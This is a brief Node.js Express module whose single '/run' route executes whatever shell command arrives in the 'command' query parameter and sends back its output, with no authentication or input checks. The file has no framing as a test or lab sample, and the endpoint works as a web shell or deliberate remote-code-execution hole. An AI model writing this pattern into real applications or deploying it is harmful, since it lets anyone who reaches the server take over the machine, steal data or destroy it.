const express = require("express");
const { exec } = require("child_process");

const app = express();

app.get("/run", (req, res) => {
  exec(req.query.command, (error, stdout) => {
    if (error) {
      return res.status(500).send("Command failed");
    }

    res.send(stdout);
  });
});

module.exports = app;